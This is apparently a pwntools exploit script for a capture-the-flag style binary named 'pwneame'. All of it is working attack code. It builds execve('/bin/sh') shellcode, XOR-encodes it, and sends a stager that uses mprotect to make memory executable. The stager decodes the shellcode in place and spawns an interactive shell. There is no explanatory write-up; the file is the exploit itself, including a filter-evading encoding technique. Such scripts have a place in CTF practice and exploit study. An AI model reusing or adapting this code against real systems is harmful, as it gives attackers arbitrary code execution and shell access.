#!/usr/bin/python3
from pwn import process, context, asm, xor

shell = process("./pwneame")
context.arch = "amd64"

shellcode  = b""
shellcode += asm("push 0x3b")                 # execve() NR
shellcode += asm("pop rax")                   # $rax = execve()
shellcode += asm("mov rdi, 0x68732f6e69622f") # $rdi = "/bin/sh"
shellcode += asm("push rdi")                  # $rsp = &"/bin/sh"
shellcode += asm("push rsp")                  # &"/bin/sh"
shellcode += asm("pop rdi")                   # $rdi = &"/bin/sh"
shellcode += asm("cdq")                       # $rdx = NULL
shellcode += asm("push rdx")                  # $rsp = &0x0
shellcode += asm("pop rsi")                   # $rdi = NULL
shellcode += asm("syscall")                   # system call execve()

shellcode = xor(shellcode, 0x1)

payload  = b""
payload += asm("lea rax, [rcx - 0xb]")        # $rax = mprotect()
payload += asm("xor rdi, rdi")                # $rdi = 0x0
payload += asm("mov edi, 0xcafeffff")         # $rdi = 0xcafeffff
payload += asm("inc di")                      # $rdi = 0xcafe0000
payload += asm("push 0x10")                   # $rsp = &0x10
payload += asm("pop rsi")                     # $rsi = 0x10
payload += asm("shl rsi, 0x8")                # $rsi = 0x1000
payload += asm("push 0x7")                    # $rsp = &0x7
payload += asm("pop rdx")                     # $rdx = 0x7
payload += asm("call rax")                    # call mprotect()

payload += asm("push 0x15")                   # $rsp = len(shellcode)
payload += asm("pop rcx")                     # $rcx = counter
payload += asm("add edi, 0x23")               # $rdi = shellcode start
payload += asm("jmp $+0x17")                  # jump xored shellcode
payload += shellcode                          # save xored shellcode
payload += asm("xor byte ptr [rdi], 0x1")     # restore xored byte
payload += asm("dec cl")                      # decrease counter
payload += asm("inc edi")                     # increase address
payload += asm("jrcxz $-0x1c")                # if $rcx == 0 -> exec shellcode
payload += asm("jmp $-0x9")                   # if $rcx != 0 -> loop to decode

shell.sendlineafter(b": \n", payload)
shell.recvlines(3)

shell.interactive()
